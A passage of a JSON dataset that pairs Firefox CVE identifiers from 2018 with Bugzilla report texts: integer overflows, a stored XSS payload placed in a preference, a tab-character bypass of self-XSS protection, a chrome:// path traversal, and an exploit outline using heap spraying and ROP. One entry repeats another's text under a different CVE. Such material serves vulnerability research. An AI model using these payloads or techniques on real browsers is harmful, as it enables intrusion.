        "description": "Received a vuln report via email from a friend. I've not confirmed (on paternity leave) but someone should check this. Bug sounds hard to exploit, but reporter want to check with us before blogging about it just in case. --VIA EMAIL BELOW ------ In the process of creating a full writeup / exploit for the Pwn2Own 2017 bug (https://www.mozilla.org/en-US/security/advisories/mfsa2017-08/) I believe have come across another bug. I am unsure whether the Chaitin team who discovered the Integer Overflow overlooked the vulnerable code, chose to ignore it, reported it alongside their Integer Overflow, or someone else found it subsequently and reported it but I haven't yet found any indication of this being the case. What's the bug? The vulnerable function is `CopyPlane` within ImageContainer.cpp (https://searchfox.org/mozilla-central/source/gfx/layers/ImageContainer.cpp#539). The issue here is that the signed 32-bit integer `width` used in the 'Slow Path' of the copy (or when aSkip is anything other than 0) is unchecked. This means that in the case of Firefox 52 a specially crafted Layout can achieve a very simple out of bounds write purely by setting the width value of a layout object to more than the calculated height. (Inside the poc.zip folder I have provided the oobwrite.html file for a simple demonstration of what i mean). What's the impact? After a bit of research and scouring through the current Firefox source, I have come to the conclusion that it is _very_ difficult to actually trigger this vulnerable function however it is not impossible. The function `CopyPlane` is referenced only within the `RecyclingPlanarYCbCrImage::CopyData`. The `CopyData` function is then referenced 9 times outside of ImageContainer however, 1 is mitigated by the fact that you removed the overloaded constructor for ImageBitmap objects in Firefox 52. I haven't had a chance to go through and attempt to trigger the bug via the remaining 8 references but i have the suspicion it could be very difficult to trigger from any other code path. For this reason i understand the impact is low but i think it is definitely worth looking at! I have actually included this out of bounds write within my writeup but - because I realised the bug may not have been reported / discovered prior to now i thought it would be best to let you know and make sure it got fixed or marked as wont-fix before i go and publish the details publicly."
      }
    ],
    "CVE-2018-5130": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1433005",
        "title": "Crash when WebRTC RTP payload type is incorrect",
        "description": "We discovered by accident that if from our remote WebRTC endpoint we send RTP packets with a correct SSRC and body but an incorrect PayloadType we can crash Firefox and cause invalid read/write or divide by zero exceptions. The details of what we are sending are RTP packets with contents originally generated by a client using Chrome with opus/48000/2 contents, but the payload type from Chrome is 111 and we were inadvertently putting that into the payload type for the packet forwarded to Firefox rather than 109 as Firefox desired via the negotiated SDP for it. The Firefox client receiving the packet seemed to consider it valid, about:webrtc showed packets being received and no errors, various WebRTC logging in Firefox also looked happy, but fairly quickly we’d crash with one of the below presumably because the audio decoding was invalid due to incorrect payload type. Once we fixed our server code forwarding these packets to set correct payload types all the crashes stopped, but this appears to be a remotely exploitable crash bug at the least with possible remote code execution potential if packets were carefully crafted and targeted? So just in case, I've marked this as a security bug. Links to submitted crash reports: https://crash-stats.mozilla.com/report/index/bp-c1cd72f1-a6f4-40de-84bb-a1ac30180123 - Write Violation https://crash-stats.mozilla.com/report/index/bp-ffd44cad-17cc-4d8c-b94d-98b0f0180123 - Divide by Zero https://crash-stats.mozilla.com/report/index/54087df8-9b05-4c7c-af2e-a2c270180123 - Read Violation"
      }
    ],
    "CVE-2018-5131": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1440775",
        "title": "fetch() force-cache mode allows reading responses with cache-control:no-store and pragma:no-cache",
        "description": "STR: 1. Open nightly 2. Visit https://http-cache-wanderview.glitch.me/ 3. Open network monitor and refresh to get it monitoring 4. Execute in console: fetch('dontcache.txt', { mode: 'same-origin', cache: 'default' }); fetch('dontcache.txt', { mode: 'same-origin', cache: 'default' }) fetch('dontcache.txt', { mode: 'same-origin', cache: 'force-cache' }) fetch('dontcache.txt', { mode: 'same-origin', cache: 'only-if-cached' }) 5. Go back to network monitor and check whether each request went to network or pulled from cache. In nightly we go to network for the first two requests, but pull from cache for the second two. Both edge and chrome go to network for the first three requests and fail the only-if-cached request. This is a security issue because it could allow someone on a public lab computer to extract logged in page data from a previous user of the machine. It seems we should not be able to see no-store/no-cache responses using fetch() force-cache/only-if-cached values."
      }
    ],
    "CVE-2018-5132": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1408194",
        "title": "WebExtension Find API can search privileged pages",
        "description": "The Find API allows you to search across privileged pages. This means you could see whats on about:debugging by searching for that string, if the user has that page open. It doesn't seem to work on about:config, that seems to be more because of how about:config works than anything else. You can't search for regex, all you can really do is search for the presence of a string on a tab. But at some point I'm sure someone will file a bug searching for regex and someone might redesign about:config and suddenly you can read any pref. For future proofing I'd like to recommend that we explicitly prevent this API from searching any about: page to prevent something accidentally leaking in the future."
      }
    ],
    "CVE-2018-5133": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1430974",
        "title": "Stored XSS in chrome://browser/content/browser-media.js line 40",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20180103231032 Steps to reproduce: Like for BUG 1430511, setting the value of the app.support.baseURL preference to include HTML content will cause an XSS issue in line 40 of chrome://browser/content/browser-media.js. Actual results: Whenever a EME video player plugins sends a cdm-disabled message to Firefox, the HTML content generated at line line 40 of chrome://browser/content/browser-media.js is showned in a notification popup. Therefore, any malicious content in the HTML code be executed including JavaScript (executed has privileged js ?!?!). Moreover, since : 1- A cdm-disabled message is triggered whenever a user is trying to play DRM while CDM plugging is disabled ; 2- Disabling CDM can be performed by writing to the prefs.js (user_pref(\"media.gmp-widevinecdm.enabled\", false);) The malicious content execution could be triggered simply visiting a Web site offfering DRM content. Expected results: The value of app.support.baseURL should be sanatized prior to be inserted in HTML content at line 40 of chrome://browser/content/browser-media.js."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1430511",
        "title": "Stored XSS in chrome://browser/content/preferences/in-content/findInPage.js line 306",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20180103231032 Steps to reproduce: Adding the following to prefs.js mozilla user profile : user_pref(\"app.support.baseURL\", \"\\\"></html:a><html:img src=\\\"nopath.nopath\\\" onerror=\\\"alert('Stored XSS');\\\"></html:img><html:a href=\\\"\"); Will cause an alert dialog box to popup when a user access chrome://browser/content/preferences/in-content/preferences.xul and perform a search with no results. Since prefs.js can be modified using a low privileged process (runonce key in HKCU registry for example) and that from the JavaScript context one can access the Standard JavaScript code modules, one can turn mozilla into a persistent malware. For example, using the OS.File module it is possible to implement a ransomware. REMARK : The dialog box do not show up when no results are returned when preferences page is loaded using the about:preferences URI. Actual results: With the preference app.support.baseURL set to the above value and from chrome://browser/content/preferences/in-content/preferences.xul searching for \"ewwe\" lead to the result shown in the attach storedxss.png Expected results: Value of the app.support.baseURL preference should be sanitized before being inserted into the html content at line 307 of chrome://browser/content/preferences/in-content/findInPage.js."
      }
    ],
    "CVE-2018-5134": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1429379",
        "title": "Web extensions can open any url using view-source:",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 Steps to reproduce: Install attached extension Actual results: view-source urls for a file URL and about:cache is opened Expected results: blocked the same way as when opening directly"
      }
    ],
    "CVE-2018-5136": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1419166",
        "title": "Cross-origin Shared Worker using data: url",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: 1. Go to http://test.shhnjk.com/2.html 2. Click on open another window button. 3. Click on stop button on one tab Actual results: Both tabs stopped counting (SharedWorker established cross-origin). Expected results: In https://html.spec.whatwg.org/multipage/workers.html#sharedworker, step 11.2's note of \"When the SharedWorker(scriptURL, options) constructor is invoked:\" says data: URLs create a worker with an opaque origin. Both the constructor origin and constructor url are compared so the same data: URL can be used within an origin to get to the same SharedWorkerGlobalScope object, but cannot be used to bypass the same origin restriction. This is not the case in Firefox and cross-origin site can create SharedWorker using data URL SharedWorker script."
      }
    ],
    "CVE-2018-5137": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1432870",
        "title": "Path traversal on chrome:// URLs",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Build ID: 20180122220231 Steps to reproduce: This bug exists in Firefox's legacy extension system. The legacy extension is still used in the browser internally. Usually, only if the extension's resources are defined on `chrome.manifest` and it has a `contentaccessible=yes` flag, the defined resources can be loaded from web pages via <script> tag or other tags. However, by using crafted path string, even non-contentaccessible resources can be loaded from web pages. Due to this bug, as I described in bug 1432358, it causes an universal bypass of CSP strict-dynamic via chrome:// URL. I attached PoC again. Steps to Reproduce: 1. See `chrome.manifest` file of browser internal resources from the following URL (in case of Windows): jar:file:///C:/Program%20Files/Nightly/browser/omni.ja!/chrome/chrome.manifest 2. Find this line: content browser browser/content/browser/ contentaccessible=yes This means that any web pages can load the resources placed on jar:file:///C:/Program%20Files/Nightly/browser/omni.ja!/chrome/browser/content/browser/* via chrome://browser/content/* URLs. 3. The resources placed on jar:file:///C:/Program%20Files/Nightly/browser/omni.ja!/chrome/devtools/* do not have a contentaccessible flag. So, usually it should not be loaded from web pages. However, using the following crafted URL, it can be loaded from web pages: (Please take notice to the two slashes of \"content//chrome\". ) chrome://browser/content//chrome/devtools/modules/devtools/client/jsonview/lib/require.js It seems that the following path format causes this issue: chrome:// [ACCESSIBLE_PATH] // [NON_ACCESSIBLE_PATH]"
      }
    ],
    "CVE-2018-5138": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1432624",
        "title": "Firefox Custom Tabs have a phishing risk",
        "description": "User Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20180104170325 Steps to reproduce: Open a site with very long domain (and, maybe, multiple subdomains) in Firefox Custom Tabs. E.g. consider this URL: https://paypal.com.securelogin.fakephissite.com/something?auth=whatever As for testing (as a proof of concept) you can use this URL: https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/?q=mnfdkjhfjksdhfjhjhfjdshjkfhsksdkjhg-greatwebsite Open it in a custom tab. (navigate to it in some way as you want) Actual results: In the attached video you see that the main domain (\"badssl.com\") is not shown in Firefox Custom Tabs, but mostly the long subdomain, but in Firefox on Android itself it is correctly shown (and even highlighted, as you can see in the video). That means if it were a paypal phishing site, It would display the URL as such: https://paypal.com…?auth=whatever I.e. it tries to show the beginning and end of the URL. But that is wrong from a security perspective, because as you can see, the user thinks they are on paypal.com now, while they are on fakephissite.com! And as any Android app can open URLs in Custom Tabs (e.g. mail apps), any URL can be untrustworthy (from untrusted sources as any mail, social media or whereever the app fetches the addresses from), so you cannot assume the URL is legit. Of course, you can _nevber_ assume that user/third-party app input is trustworthy. Expected results: As in Firefox, do show (and potentially even highlight) the main domain and *not* the subdomain. Do not abbreviate the main domain."
      }
    ],
    "CVE-2018-5140": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1424261",
        "title": "moz-icon images can be linked and read from the web",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: Tested on Nightly 59.0a1 (2017-12-07) (64-bit). View attached PoC. Actual results: It seems that we can still link moz-icon urls if we include the current pages URL within it like so: moz-icon:http://localhost/poc.html?size=64&contentType=application/xml I then noticed that we can read the image through canvas.toDataURL. So we are now able to determine which application is used to open certain file types, as well as potential fingerprinting of user within private browsing (?). Expected results: moz-icon should be blocked from linking on the web. Also I think its worth checking why canvas.toDataURL is working here."
      }
    ],
    "CVE-2018-5141": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1429093",
        "title": "Push API allows DOM event without user interaction",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36 Steps to reproduce: I've created an application that uses the notification Push API. In the service worker JS. I've created a listener for the 'NotificationClose' event, which launches a DOM interaction (opens a new tab on browser). Then, I've registered to the application with Firefox (allowing it to send me push notification). Finally, I've sent few consecutive push notifications to the endpoint in a short time (for example 5 notification in 4 seconds). Example code fro service worker is attached. Actual results: When sending few consecutive notifications, I was able to invoke the 'notification close' event without user interaction. Furthermore, each notification launched a new Tab (invoking a DOM event). In essence: 1) If the browser was opened, I was able to remotely open an arbitrary amount of tabs on the browser without user interaction. 2) If the browser was closed, all the tabs open upon next launch. This behavior puts the user in risk: 1) Adware: If the user once allowed a malicious application to send notification, now the ad providers can launch as many ads as they choose without the user interaction. 2) Persistence for attackers: if once I was able to get a user to register to my app, I can now redirect him to malicious link (for example containing CSRF or XSS) whenever I choose (for example I will send the user to a CSRF link again and again without his interaction, until he has a valid session with the target application). 3) Client side denial of service: I can launch infinite numbers of tabs every time the user opens the browser, effectively rendering the browser unusable. It is important to stress that the user cannot stop the attack once the notifications were allowed, I.e. he cannot prevent the attacker from opening a tab on his browser Expected results: Events (such as 'close notification') should require user interaction. Furthermore: 1. close / push events should not allowed DOM interaction (opening a tab, for example). note that this is enforced in Chrome. 2. DOM intercations should be limited to 'one at a time', and not queued without restriction."
      }
    ],
    "CVE-2018-5143": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1422643",
        "title": "Self-XSS protection bypass with tab characters",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0 Build ID: 20171203100121 Steps to reproduce: Usually, to mitigate the self-XSS via the address bar, Firefox removes \"javascript:\" string when \"javascript:[XSS_HERE]\" URL is pasted to the address bar. However, if there is a tab character between \"javascript:\" string, like \"java[0x09]script:alert(1)\", Firefox does not remove it although JavaScript is executed from that string by tapping the enter key. Steps to Reproduce: 1. Open the attached PoC. 2. Copy the string in the textarea. 3. Paste it to the address bar. 4. When the enter key is pressed, JavaScript is executed. Actual results: The self-XSS protection does not work. Expected results: The self-XSS protection should work."
      }
    ],
    "CVE-2018-5144": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1440926",
        "title": "Overflow in nsUnicodeToBIG5::GetMaxLength can create memory-safety bugs in callers",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20171128222554 Steps to reproduce: nsUnicodeToBIG5::GetMaxLength (/ff-esr52/intl/uconv/ucvtw/nsUnicodeToBIG5.cpp) performs an unchecked integer computation based on the int32 value provided by the caller, and returns the result in the int32 out parameter provided by the caller: NS_IMETHODIMP nsUnicodeToBIG5::GetMaxLength(const char16_t* aSrc, int32_t aSrcLength, int32_t* aDestLength) { *aDestLength = (aSrcLength * 2) + // <<<<<<<<<<<<<< (0) (mPendingTrail ? 1 : 0) + // If the lead ends up being paired, the bytes produced // are already included above. // If not, it produces a single '?'. (mUtf16Lead ? 1 : 0); return NS_OK; } In case that aSrcLength is 0x7fffffff, or even 0x7ffffffd if the two flags mPendingTrail and mUtf16Lead are set to true, aDestLength will overflow at (0), and a near-zero negative value will be returned to the caller. nsUnicodeToBIG5 is a member of nsIUnicodeEncoder family of classes, which provides an abstracted Unicode encoding facility to a variety of callers around the code base, including DOM and Javascript engines, which operate almost entirely on user-controlled data. The various nsUnicodeTo* classes may be invoked via a dispatcher instance of nsIUnicodeEncoder, as follows, for instance: nsCOMPtr<nsIUnicodeEncoder> mEncoder; mEncoder = EncodingUtils::EncoderForEncoding(charset); // charset value may be obtained from user-controlled data mEncoder->GetMaxLength(src, src.Length(), ...); In case that the charset is set to \"big5\", nsUnicodeToBIG5::GetMaxLength will be called. GetMaxLength is declared as follows in nsIUnicodeEncoder.h: /** * Returns a quick estimation of the size of the buffer needed to hold the * converted data. Remember: this estimation is >= with the actual size of * the buffer needed. It will be computed for the \"worst case\" * * @param aSrc [IN] the source data buffer * @param aSrcLength [IN] the length of source data buffer * @param aDestLength [OUT] the needed size of the destination buffer * @return NS_OK_UENC_EXACTLENGTH if an exact length was computed * NS_ERROR_OUT_OF_MEMORY if OOM * NS_OK if all we have is an approximation */ MOZ_MUST_USE NS_IMETHOD GetMaxLength(const char16_t* aSrc, int32_t aSrcLength, int32_t* aDestLength) = 0; ... Note that because GetMaxLength is prototyped as fallible, the callers expect it to signal of any internal failure, and therefore are unlikely to double-check the validity of the returned value. The implications of a buffer size estimation procedure returning a negative value are almost certainly security relevant, however the actual impact depends on how exactly the caller uses the returned value. Consider for example, nsScriptableUnicodeConverter::ConvertFromUnicodeWithLength (/ff-esr52/intl/uconv/nsScriptableUConv.cpp): nsresult nsScriptableUnicodeConverter::ConvertFromUnicodeWithLength(const nsAString& aSrc, int32_t* aOutLen, char **_retval) { if (!mEncoder) return NS_ERROR_FAILURE; nsresult rv = NS_OK; int32_t inLength = aSrc.Length(); const nsAFlatString& flatSrc = PromiseFlatString(aSrc); rv = mEncoder->GetMaxLength(flatSrc.get(), inLength, aOutLen); // <<< (1) if (NS_SUCCEEDED(rv)) { *_retval = (char*)malloc(*aOutLen+1); // <<<<<<<<<< (2) if (!*_retval) return NS_ERROR_OUT_OF_MEMORY; rv = mEncoder->Convert(flatSrc.get(), &inLength, *_retval, aOutLen); // <<<<<<<<<< (3) if (NS_SUCCEEDED(rv)) { (*_retval)[*aOutLen] = '\\0'; // <<<<<<<<<<< (4) return NS_OK; } free(*_retval); } *_retval = nullptr; return NS_ERROR_FAILURE; } At (1), GetMaxLength() can return -1 (0xffffffff), which then would be used by malloc at (2) to allocate a buffer of size 0, leading to a heap corruption (i.e. a buffer overflow, or nulling of the trailing byte of the preceding heap chunk) at either (3) or/and (4). There are also other places in the code base, where GetMaxLength() is used in a similar fashion. The issue was verified with the latest release code of Firefox ESR. Actual results: n/a Expected results: n/a"
      }
    ],
    "CVE-2018-5145": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1261175%2C1348955",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0 Build ID: 20171128222554 Steps to reproduce: nsUnicodeToBIG5::GetMaxLength (/ff-esr52/intl/uconv/ucvtw/nsUnicodeToBIG5.cpp) performs an unchecked integer computation based on the int32 value provided by the caller, and returns the result in the int32 out parameter provided by the caller: NS_IMETHODIMP nsUnicodeToBIG5::GetMaxLength(const char16_t* aSrc, int32_t aSrcLength, int32_t* aDestLength) { *aDestLength = (aSrcLength * 2) + // <<<<<<<<<<<<<< (0) (mPendingTrail ? 1 : 0) + // If the lead ends up being paired, the bytes produced // are already included above. // If not, it produces a single '?'. (mUtf16Lead ? 1 : 0); return NS_OK; } In case that aSrcLength is 0x7fffffff, or even 0x7ffffffd if the two flags mPendingTrail and mUtf16Lead are set to true, aDestLength will overflow at (0), and a near-zero negative value will be returned to the caller. nsUnicodeToBIG5 is a member of nsIUnicodeEncoder family of classes, which provides an abstracted Unicode encoding facility to a variety of callers around the code base, including DOM and Javascript engines, which operate almost entirely on user-controlled data. The various nsUnicodeTo* classes may be invoked via a dispatcher instance of nsIUnicodeEncoder, as follows, for instance: nsCOMPtr<nsIUnicodeEncoder> mEncoder; mEncoder = EncodingUtils::EncoderForEncoding(charset); // charset value may be obtained from user-controlled data mEncoder->GetMaxLength(src, src.Length(), ...); In case that the charset is set to \"big5\", nsUnicodeToBIG5::GetMaxLength will be called. GetMaxLength is declared as follows in nsIUnicodeEncoder.h: /** * Returns a quick estimation of the size of the buffer needed to hold the * converted data. Remember: this estimation is >= with the actual size of * the buffer needed. It will be computed for the \"worst case\" * * @param aSrc [IN] the source data buffer * @param aSrcLength [IN] the length of source data buffer * @param aDestLength [OUT] the needed size of the destination buffer * @return NS_OK_UENC_EXACTLENGTH if an exact length was computed * NS_ERROR_OUT_OF_MEMORY if OOM * NS_OK if all we have is an approximation */ MOZ_MUST_USE NS_IMETHOD GetMaxLength(const char16_t* aSrc, int32_t aSrcLength, int32_t* aDestLength) = 0; ... Note that because GetMaxLength is prototyped as fallible, the callers expect it to signal of any internal failure, and therefore are unlikely to double-check the validity of the returned value. The implications of a buffer size estimation procedure returning a negative value are almost certainly security relevant, however the actual impact depends on how exactly the caller uses the returned value. Consider for example, nsScriptableUnicodeConverter::ConvertFromUnicodeWithLength (/ff-esr52/intl/uconv/nsScriptableUConv.cpp): nsresult nsScriptableUnicodeConverter::ConvertFromUnicodeWithLength(const nsAString& aSrc, int32_t* aOutLen, char **_retval) { if (!mEncoder) return NS_ERROR_FAILURE; nsresult rv = NS_OK; int32_t inLength = aSrc.Length(); const nsAFlatString& flatSrc = PromiseFlatString(aSrc); rv = mEncoder->GetMaxLength(flatSrc.get(), inLength, aOutLen); // <<< (1) if (NS_SUCCEEDED(rv)) { *_retval = (char*)malloc(*aOutLen+1); // <<<<<<<<<< (2) if (!*_retval) return NS_ERROR_OUT_OF_MEMORY; rv = mEncoder->Convert(flatSrc.get(), &inLength, *_retval, aOutLen); // <<<<<<<<<< (3) if (NS_SUCCEEDED(rv)) { (*_retval)[*aOutLen] = '\\0'; // <<<<<<<<<<< (4) return NS_OK; } free(*_retval); } *_retval = nullptr; return NS_ERROR_FAILURE; } At (1), GetMaxLength() can return -1 (0xffffffff), which then would be used by malloc at (2) to allocate a buffer of size 0, leading to a heap corruption (i.e. a buffer overflow, or nulling of the trailing byte of the preceding heap chunk) at either (3) or/and (4). There are also other places in the code base, where GetMaxLength() is used in a similar fashion. The issue was verified with the latest release code of Firefox ESR. Actual results: n/a Expected results: n/a"
      }
    ],
    "CVE-2018-5146": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1446062",
        "title": "ZDI-CAN-5822 - Mozilla Firefox Audio Driver Out of Bounds",
        "description": "From exploit files: Mozilla Firefox to SYSTEM exploit by Richard Zhu (fluorescence) The exploit uses an out of bounds bug in audio parsing to achieve code execution inside Firefox. The vulnerability occurs when parsing vorbis audio formats: long vorbis_book_decodev_add(codebook *book,float *a,oggpack_buffer *b,int n){ if(book->used_entries>0){ int i,j,entry; float *t; if(book->dim>8){ for(i=0;i<n;){ entry = decode_packed_entry_number(book,b); if(entry==-1)return(-1); t = book->valuelist+entry*book->dim; for (j=0;j<book->dim;) a[i++]+=t[j++]; // out of bounds access, i can be greater than n } To exploit this, I do a mixed spray of Arrays and ArrayBuffers. I load the audio file to trigger the out of bounds bug, which will overwrite the length of an Array. I then find an ArrayBuffer allocated after the corrupted Array. Because the array's length has been changed, I can freely read and write into the ArrayBuffer from the Array. I write JS objects into the ArrayBuffer and read their addresses. Then, I use this ArrayBuffer to create fake objects. These objects can be retrieved by the corrupted Array, leading to arbitrary read/write. Then, I hijack a vtable and ROP to get code execution."
      }
    ],
    "CVE-2018-5147": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1446365",
        "title": "Out of bounds write in libtremor",
        "description": "+++ This bug was initially created as a clone of Bug #1446062 +++ Huzaifa Sidhpurwala reported that libtremors has the same problem as the original bug 1446062 in libvorbis (See bug 1446062 comment 26). This was patched as a continuation of that bug. CVE rules seem to require a separate CVE for the separate implementation (products could have one and not be affected by the other) so I'm creating this as a placeholder. The patch is attachment 8959436 [details] [diff] [review]"
      }
    ],
    "CVE-2018-5148": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1440717",
        "title": "AddressSanitizer: heap-use-after-free [@ mozilla::gl::GLContext::MakeCurrent] with READ of size 8",
        "description": "Crash seen while fuzzing m-c 20180223-f7c5598e45c3, but I don't have a testcase that reproduces the issue. ==6735==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e000161918 at pc 0x000109286765 bp 0x70000f46d600 sp 0x70000f46d5f8 READ of size 8 at 0x61e000161918 thread T34 #0 0x109286764 in mozilla::gl::GLContext::MakeCurrent(bool) const (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x27e6764) #1 0x10943dc35 in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299dc35) #2 0x10943de9d in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299de9d) #3 0x10969c844 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc844) #4 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #5 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #6 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #7 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #8 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #9 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #10 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #11 0x10976b77a in mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccb77a) #12 0x10976ba94 in non-virtual thunk to mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccba94) #13 0x10973ce2e in mozilla::layers::CrossProcessCompositorBridgeParent::DeallocPLayerTransactionParent(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c9ce2e) #14 0x10855844f in mozilla::layers::PCompositorBridgeParent::RemoveManagee(int, mozilla::ipc::IProtocol*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ab844f) #15 0x107f16c63 in mozilla::layers::PLayerTransactionParent::Send__delete__(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1476c63) #16 0x10976c201 in mozilla::layers::LayerTransactionParent::RecvShutdown() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccc201) #17 0x107f19af6 in mozilla::layers::PLayerTransactionParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1479af6) 0x61e000161918 is located 1176 bytes inside of 2640-byte region [0x61e000161480,0x61e000161ed0) freed by thread T34 here: #0 0x103223b4d in wrap_free (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58b4d) #1 0x1094aca05 in mozilla::layers::TextureImageTextureSourceOGL::~TextureImageTextureSourceOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2a0ca05) #2 0x1097053bf in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c653bf) #3 0x1097055fd in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c655fd) #4 0x1093dae51 in mozilla::AtomicRefCountedWithFinalize<mozilla::layers::TextureHost>::Release() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x293ae51) #5 0x1097422cb in mozilla::layers::ParentActor<mozilla::layers::PTextureParent>::RecvDestroy() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ca22cb) #6 0x1081967db in mozilla::layers::PTextureParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x16f67db) #7 0x108572598 in mozilla::layers::PCompositorManagerParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ad2598) #8 0x107c3d8c7 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x119d8c7) previously allocated by thread T34 here: #0 0x103223993 in wrap_malloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58993) #1 0x1025841bd in moz_xmalloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libmozglue.dylib:x86_64+0x21bd) #2 0x109338c07 in mozilla::gl::GLContextProviderCGL::CreateForWindow(nsIWidget*, bool, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2898c07) #3 0x10933888a in mozilla::gl::GLContextProviderCGL::CreateForCompositorWidget(mozilla::widget::CompositorWidget*, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x289888a) #4 0x109440e7f in mozilla::layers::CompositorOGL::CreateContext() 